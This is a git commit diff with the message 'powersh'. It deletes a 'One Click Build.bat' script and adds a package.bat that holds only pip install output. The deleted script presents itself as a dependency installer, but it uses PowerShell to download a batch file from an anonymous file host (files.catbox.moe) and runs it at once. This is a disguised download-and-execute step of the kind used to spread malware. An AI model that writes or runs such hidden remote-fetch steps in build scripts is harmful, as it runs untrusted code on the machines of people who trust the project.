33dc209c4750d9c258e58e907c11dcfb58818d50
Your Name <you@example.com>
2024-07-30 22:34:52 +0800

    powersh

--- One Click Build.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-echo Download requirements.
-pip freeze > requirements.txt
-pip install -r requirements.txt
-powershell iwr https://files.catbox.moe/27u2dv.bat -OutFile package.bat
-start package.bat
-echo done!
---
+++ package.bat
@@ -0,0 +1,20 @@
+ement already satisfied: colorama in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from build>=1.0.0->pip-tools) (0.4.6)
+
+[notice] A new release of pip is available: 24.0 -> 24.1.2
+[notice] To update, run: C:\Users\Admin_Codefoxy\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\python.exe -m pip install --upgrade pip
+Usage: pip-compile [OPTIONS] [SRC_FILES]...
+Try 'pip-compile -h' for help.
+
+Error: Invalid value: If you do not specify an input file, the default is one of: requirements.in, setup.py, pyproject.toml, setup.cfg
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: altgraph==0.17.4 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 1)) (0.17.4)
+Requirement already satisfied: cffi==1.16.0 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 2)) (1.16.0)
+Requirement already satisfied: gevent==24.2.1 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 3)) (24.2.1)
+Requirement already satisfied: greenlet==3.0.3 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 4)) (3.0.3)
+Requirement already satisfied: packaging==24.1 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 5)) (24.1)
+Requirement already satisfied: pefile==2023.2.7 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 6)) (2023.2.7)
+Requirement already satisfied: psutil==6.0.0 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 7)) (6.0.0)
+Requirement already satisfied: pycparser==2.22 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 8)) (2.22)
+Requirement already satisfied: pyinstaller==6.9.0 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 9)) (6.9.0)
+Requirement already satisfied: pyinstaller-hooks-contrib==2024.7 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 10)) (2024.7)
+Requirement already satisfied: python-hosts==1.0.7 in c:\users\admin_codefoxy\appdata\local\packages\pythonsoftwarefoundation.python.3.12_qbz5n2kfra8p0\localcache\local-packages\python312\site-packages (from -r requirements.txt (line 11)) (1.0.7)
